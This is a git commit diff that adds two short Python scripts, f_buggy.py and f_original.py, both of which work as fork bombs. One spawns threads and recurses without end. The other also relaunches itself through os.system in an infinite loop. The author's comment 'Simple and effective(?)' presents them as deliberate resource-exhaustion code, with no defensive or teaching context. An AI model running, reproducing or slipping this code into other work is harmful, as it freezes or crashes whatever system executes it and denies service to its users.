36af4abcb5f69a0c97adc28c4bd65a0172f4e153
Subhaditya Nath <sn03.general@gmail.com>
2020-03-24 13:07:43 +0530

    f to three f's

---
+++ f_buggy.py
@@ -0,0 +1,9 @@
+import os,threading as t
+
+def f():
+    while True:
+        os.system('python f_buggy.py')
+        t.Thread(target=f).start()
+        f()
+
+f()
---
+++ f_original.py
@@ -0,0 +1,9 @@
+##  Simple and effective(?)
+##  Cheers  :D
+import threading as t
+def f():
+    while True:
+        t.Thread(target=f).start()
+        f()
+
+f()
